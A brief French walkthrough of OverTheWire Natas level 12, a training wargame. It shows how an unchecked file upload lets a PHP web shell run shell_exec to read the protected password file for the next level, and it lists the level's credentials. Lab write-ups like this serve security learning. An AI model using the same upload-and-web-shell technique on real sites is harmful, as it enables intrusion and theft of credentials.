## Connexion (username=natas12 password=EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng)
```
http://natas12.natas.labs.overthewire.org/
```

## Recherche du mot de passe
On peut upload un fichier sans que son extension soit vérifié.
On peut créer un fichier php comme suit:
```php
<?php echo shell_exec('cat /etc/natas_webpass/natas13'); ?>
```

On peut l'upload par la suite mais il faudra inspecter la page, modifier l'extension de la balise input pour changer jpg pour php.

Il faut cliquer ensuite sur le lien qui va apparaitre.

**A noter que le php s'exécute parce que le fichier est sur un répertoire accessible via le web.
Donc c'est associé à un URL et lorsque questionné via notre fureteur ça déclenche son exécution.**
## Prochain mot de passe
```
g8ba0olAzaSJuyS4gnmbdVVigAICLG1k
```